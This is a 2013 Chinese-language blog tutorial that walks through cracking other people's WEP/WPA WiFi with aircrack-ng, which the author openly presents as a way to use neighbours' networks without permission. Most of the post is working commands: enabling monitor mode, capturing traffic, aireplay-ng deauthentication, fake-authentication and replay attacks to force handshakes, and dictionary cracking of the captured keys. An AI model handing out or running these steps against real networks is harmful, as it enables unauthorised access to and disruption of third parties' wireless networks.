# 教你破解无线路由

- date: 2013-02-03
- category: Work
- tags: wifi, aireplay-ng

----

阳历年前一直住在美立方，刚去美立方的时候，从2月初到3月初，无法上网，于我这个宅人真是憋闷一场。好在后来情况发生变化，美立方是个新小区，3月初的时候小区宽带业务终于开始推行了，10M带宽一年只需1099元，于是我和一起合租的众人就办理了。第一次用10M的网，上网速度真是快，下载东西不亦乐乎。时间飞快，好景不长，阳历年后租房合同到期，我和豆子搬到了对面的大羊坊，终于又要无网可上一段时间了。

想到北京的北漂者很多都像我这样吧，一年总要苦逼的搬一次家，搬一次家就会有段时间断网。没有网络生活就会失去很多乐趣，电视神马的已经落后时代了，我已经有很多年没看过电视了，网络于我几乎是必须品。

说了这么多，其实只想说一句话——对于我们流浪的北漂者没事蹭下网也是被逼无奈之举，被蹭者请原谅我们吧，这只是我们屌丝小小的一次逆袭巴拉巴拉巴拉巴拉.....

好吧，正文开始。

### 1.准备工作

a. 准备一个linux系统(推荐ubuntu)，需要用它安装我们主要的破解工具：Aircrack-ng；或者直接从网上下载BT5更好，就不需要安装aircrack-ng了。 b. 准备一个字典文件，最好是破解wpa专用的，或者使用本文最后附带的字典文件。

### 2.安装Aircrack-ng

首先从Aircrack-ng官网下载源码，并解压缩：

    xiaoxie@xiaoxie-laptop:~$ wget http://download.aircrack-ng.org/aircrack-ng-1.1.tar.gz
    xiaoxie@xiaoxie-laptop:~$ tar -xzvf aircrack-ng-1.1.tar.gz
    

进入文件目录进行编译安装：

    xiaoxie@xiaoxie-laptop:~$ cd aircrack-ng-1.1
    xiaoxie@xiaoxie-laptop:~/aircrack-ng-1.1$ make
    xiaoxie@xiaoxie-laptop:~/aircrack-ng-1.1$ make install
    

如果没有错误，表示安装成功。

### 3.确认网卡兼容性

首先使用lspci查看下系统使用了哪种网卡：

    xiaoxie@xiaoxie-laptop:~$ lspci
    ......
    04:00.0 Network controller: Broadcom Corporation BCM4313 802.11b/g/n 
    Wireless LAN Controller (rev 01)
    05:00.0 Ethernet controller: Realtek Semiconductor Co., Ltd. 
    RTL8101E/RTL8102E PCI Express Fast Ethernet controller (rev 02)
    

在其列出的信息中即可看到我电脑当前使用的无线网卡类型是BCM4313，然后到这个[地址][1]看下Aircrack-ng是否兼容它。如果兼容，那么恭喜你，你可以在你自己的Linux系统下使用Aircrack-ng；否则，下载BT5吧。

如果你安装的是Ubuntu，在这里有一个[列表][2]，内容非常详细，几乎列出了所有常见无线网卡的驱动支持情况和安装方法。还有一个地方是不可错过的，就是著名的[compat-wireless][3]。

### 4.使用Aircrack-ng破解

使用Aircrack-ng破解wifi的一般步骤如下：

#### 4.1 开启无线网卡的监听模式(airmon-ng)

首先需要查看下当前系统无线网卡的名称，打开一个终端，输入如下命令：

    xiaoxie@xiaoxie-laptop:~$ iwconfig
    lo        no wireless extensions.
    
    wlan0      IEEE 802.11abg  ESSID:"xxx"  
              Mode:Managed  Frequency:2.437 GHz  Access Point: 38:xx:45:BE:xx:xx   
              Retry  long limit:7   RTS thr:off   Fragment thr:off
              Power Management:off
    
    eth0      no wireless extensions.
    

这条命令会列出所有的无线网卡，比如上面，可用的无线网卡名称就是wlan0。下面开启此网卡的监听模式：

    xiaoxie@xiaoxie-laptop:~$ sudo airmon-ng start wlan0
    ......
    Interface   Chipset     Driver
    
    wlan0       Unknown     brcmsmac - [phy0]
                    (monitor mode enabled on mon0)
    

看到`monitor mode enabled on mon0`类似说明文字，说明开启成功。

#### 4.2开始监听周围的数据包(airodump-ng)

airodump-ng 命令后可带一些参数，比如指定监听频道，监听指定的AP等，具体使用方法如下：

    airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w output mon0
    

-c ：后加数字，指定所要监听的频道(范围1-11)  
--bssid ：后加AP的mac地址，指定所要监听的AP  
-w ：后加名称，指定监听到的可用数据包写入文件的名称  
mon0 ：开启了监听模式的网卡名称

首先使用默认命令查看周围的AP

    xiaoxie@xiaoxie-laptop:~$ sudo airodump-ng mon0
    

<p align="center"><img src="/media/2013/02/4236977490.png"></p>

上图显示了周围可以搜索到的AP(上列表)和终端(下列表)及详细信息。下面是对列表的具体解释：

**上列表**

BSSID：显示的是AP(热点)的mac地址  
PWR：表示信号的强度，信号强度是一个负值，值越大信号越强  
Beacons：广播速率，数据增长越快说明这个AP越活跃，数据交换量越大 #Data：可用数据，这里指可用于破解的数据包 #/s：每秒接收到可用数据包的个数

CH：AP所使用的频道  
MB：AP的带宽，现在一般都是54M的了  
ENC：密钥加密方式，一般是WEP/WAP或WAP2两种  
CIPHER：密钥管理和数据加密方式，一般有CCMP和TKIP两种  
AUTH：授权方式，一般有PSK/OPEN，PSK指预共享方式分发密钥  
ESSID：AP的标识名称 

**下列表**

STATION：表示客户端的mac  
Rate：表示客户端与AP交换数据速率  
Lost：客户端丢包个数  
Packets：客户端总的广播包个数  
Probes：客户端连接的AP点名称 

根据以上信息，选择一个信号较好的AP进行破解：

    xiaoxie@xiaoxie-laptop:~$ sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 --ivs -w output mon0
    

注：--ivs参数表示只将接收到的ivs数据包写入到文件中，如果破解的AP加密方式是WEP最好加上此参数，如果是WAP加密方式的请去掉此参数。

#### 4.3攻击指定AP(aireplay-ng)

攻击AP可使AP发送更多的可用数据包，对于WEP方式来说是IVs数据包，对于WAP方式来说是握手包(M1-M7)。aireplay-ng命令提供了九种攻击方式，它们应用于不同的场景发挥不同的作用。

    Attack 0: Deauthentication 
    Attack 1: Fake authentication 
    Attack 2: Interactive packet replay 
    Attack 3: ARP request replay attack 
    Attack 4: KoreK chopchop attack 
    Attack 5: Fragmentation attack
    Attack 6: Cafe-latte attack 
    Attack 7: Client-oriented fragmentation attack
    Attack 8: WPA Migration Mode
    Attack 9: Injection test
    

之前开启的终端不要关闭，重新打开一个终端。

##### 4.3.1在WEP场景下

如果你攻击的是使用WEP加密方式的AP,可以进行如下攻击：

进行注入测试

    aireplay-ng -9 -a 目标MAC地址  mon0
    

1）断开一个已知已经连接AP的客户端，使其重新发送认证数据包IVs

    aireplay-ng -1 0 -a 目标MAC地址 -h 客户端MAC mon0
    

从AP获取包含伪随机码生成算法的数据包，数据包只包含少量的密钥，但可用于组合成各种注入包

    aireplay-ng -5 -b 目标MAC地址 -h 客户端MAC mon0
    

2）如果你在airodump-ng命令后没有看到连接到AP的客户端，可使用下面的命令攻击

    aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b 目标MAC地址 -h 本机MAC地址 mon0
    

在使用上述命令后，在前一个终端中，接收到的数据包(#Data列)将会迅速增长，增长到大约1万时就可以进行WEP的破解了。

##### 4.3.2在WAP场景下

如果你攻击的是使用WAP加密方式的AP，可以进行如下攻击：

向AP发送取消认证的数据包，使一个或多个客户端与AP断开，迫使其发送握手包进行重新链接

    aireplay-ng -0 10 -a 目标MAC地址 -c 客户端MAC地址 MAC mon0
    

在使用上述命令后，在前一个终端中，#Data列数据将会增长，直到终端中显示如下描述时就可以进行WAP的破解了。

    WPA handshake: 00:14:6C:7E:40:80
    

> PS：更多攻击方式的使用示例请看这里吧：http://www.aircrack-ng.org/doku.php?id=aireplay-ng

#### 4.4破解数据包(aircrack-ng)

打开第三个终端，开始破解：

    aircrack-ng -w password.lst -b 目标MAC地址 output*.cap
    

-w 指定使用的字典文件

> PS：WEP加密方式再复杂的密码在5分钟内就可以破解出来，而WAP加密方式就要看字典文件、密码复杂度以及运气和人品了。

### 5.参考：

1.aireplay-ng的九种攻击方式：<http://jim19770812.blogspot.com/2012/05/aircrack-ng.html>  
2.各种破解教程：<http://www.aircrack-ng.org/doku.php?id=tutorial>  
3.Ubuntu支持无线网卡驱动信息：<https://help.ubuntu.com/community/WifiDocs/Driver>

 [1]: http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#which_is_the_best_card_to_buy
 [2]: https://help.ubuntu.com/community/WifiDocs/Driver
 [3]: http://linuxwireless.org/